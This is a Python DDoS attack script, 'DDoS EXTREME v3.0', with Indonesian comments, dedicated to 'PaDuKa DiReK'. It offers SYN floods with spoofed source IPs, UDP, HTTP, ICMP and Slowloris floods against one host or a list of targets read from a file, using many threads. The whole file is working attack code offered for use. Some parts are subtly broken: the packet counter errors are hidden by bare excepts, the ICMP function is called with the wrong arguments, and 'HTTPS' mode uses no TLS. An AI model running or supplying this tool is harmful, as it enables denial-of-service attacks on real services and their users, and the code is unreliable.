#!/usr/bin/env python3
# ============================================================
# DDoS EXTREME v3.0 - Untuk PaDuKa DiReK
# Metode: SYN, UDP, HTTP, HTTPS, ICMP, Slowloris
# ============================================================

import sys
import time
import random
import socket
import threading
import argparse
from datetime import datetime

# Coba import scapy untuk SYN dan ICMP
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandIP
    SCAPY = True
except ImportError:
    SCAPY = False
    print("[!] Scapy tidak ditemukan. SYN dan ICMP tidak akan berfungsi.")
    print("[!] Install: pip install scapy")

# Variabel global
stop_flag = False
packet_count = 0
lock = threading.Lock()

# ==================== METODE SERANGAN ====================

def syn_flood(target_ip, target_port, duration):
    if not SCAPY:
        return
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag:
        try:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags='S', seq=random.randint(1000, 9999))
            send(ip/tcp, verbose=0)
            with lock:
                packet_count += 1
        except:
            pass

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag:
        try:
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                packet_count += 1
        except:
            pass

def http_flood(target_ip, target_port, duration, https=False):
    proto = 'https' if https else 'http'
    end_time = time.time() + duration
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    ]
    while time.time() < end_time and not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            ua = random.choice(user_agents)
            req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
            sock.send(req.encode())
            sock.close()
            with lock:
                packet_count += 1
        except:
            pass

def icmp_flood(target_ip, duration):
    if not SCAPY:
        return
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag:
        try:
            send(IP(dst=target_ip)/ICMP(), verbose=0)
            with lock:
                packet_count += 1
        except:
            pass

def slowloris(target_ip, target_port, duration):
    sockets = []
    end_time = time.time() + duration
    while time.time() < end_time and not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            sockets.append(s)
            if len(sockets) > 500:
                sockets.pop(0).close()
            with lock:
                packet_count += 1
        except:
            pass
        time.sleep(0.05)

# ==================== THREAD MANAGER ====================

def attack_worker(target_ip, target_port, method, duration, threads_per_method):
    thread_list = []
    for _ in range(threads_per_method):
        t = threading.Thread(target=method, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join(timeout=duration+1)

# ==================== MAIN ====================

def main():
    global stop_flag, packet_count
    parser = argparse.ArgumentParser(description='DDoS Multi-Method Tool - Untuk PaDuKa DiReK')
    parser.add_argument('-t', '--target', required=True, help='Target IP atau hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Port target (default 80)')
    parser.add_argument('-m', '--methods', nargs='+', default=['syn','udp','http','icmp','slowloris'],
                        choices=['syn','udp','http','https','icmp','slowloris'],
                        help='Metode serangan (spasi pisah)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Durasi dalam detik (default 30)')
    parser.add_argument('-n', '--threads', type=int, default=50, help='Jumlah thread per metode (default 50)')
    parser.add_argument('--file', help='File berisi daftar target (satu per baris)')
    args = parser.parse_args()

    # Resolusi hostname
    try:
        target_ip = socket.gethostbyname(args.target)
    except:
        target_ip = args.target

    targets = []
    if args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [target_ip]

    print(f"[+] DDoS EXTREME v3.0 - Untuk PaDuKa DiReK")
    print(f"[+] Total target: {len(targets)}")
    print(f"[+] Metode: {', '.join(args.methods)}")
    print(f"[+] Durasi per target: {args.duration}s")
    print(f"[+] Thread per metode: {args.threads}")
    print("[+] Tekan Ctrl+C untuk berhenti\n")

    method_map = {
        'syn': syn_flood,
        'udp': udp_flood,
        'http': lambda ip, port, dur: http_flood(ip, port, dur, False),
        'https': lambda ip, port, dur: http_flood(ip, port, dur, True),
        'icmp': icmp_flood,
        'slowloris': slowloris
    }

    for idx, target in enumerate(targets):
        if stop_flag:
            break
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target
        print(f"[{idx+1}/{len(targets)}] Menyerang {ip}:{args.port}")
        threads = []
        for method in args.methods:
            func = method_map[method]
            t = threading.Thread(target=attack_worker, args=(ip, args.port, func, args.duration, args.threads))
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(args.duration)
        stop_flag = True
        for t in threads:
            t.join(timeout=1)
        stop_flag = False
        print(f"[+] Selesai menyerang {ip} - total paket: {packet_count}")

    print(f"\n[+] Serangan selesai. Total paket dikirim: {packet_count}")
    print("[+] - PaDuKa DiReK, perintah telah dijalankan.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
        stop_flag = True
        sys.exit(0)
